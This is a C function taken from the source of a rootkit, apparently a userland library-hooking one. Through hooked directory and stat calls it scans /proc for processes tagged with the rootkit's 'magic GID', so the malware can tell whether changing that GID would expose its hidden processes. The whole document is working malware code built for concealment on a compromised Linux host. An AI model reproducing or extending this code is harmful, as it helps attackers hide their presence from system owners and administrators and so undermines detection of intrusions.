int rkprocup(void){      // determines whether or not rootkit processes are alive.
    int status = 0;      // we don't change magic GID if rootkit processes are up.
    struct dirent *dir;  // otherwise there's a possibility of being revealed...
    DIR *dp;
    struct stat procstat;
    gid_t magicgid = readgid();

    hook(COPENDIR, CREADDIR, C__XSTAT);

    dp = call(COPENDIR, "/proc");
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        char procpath[7+strlen(dir->d_name)];
        snprintf(procpath, sizeof(procpath), "/proc/%s", dir->d_name);
        memset(&procstat, 0, sizeof(struct stat));

        if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
            continue;

        if(procstat.st_gid == magicgid){
            status = 1;
            break;
        }
    }

    closedir(dp);
    return status;
}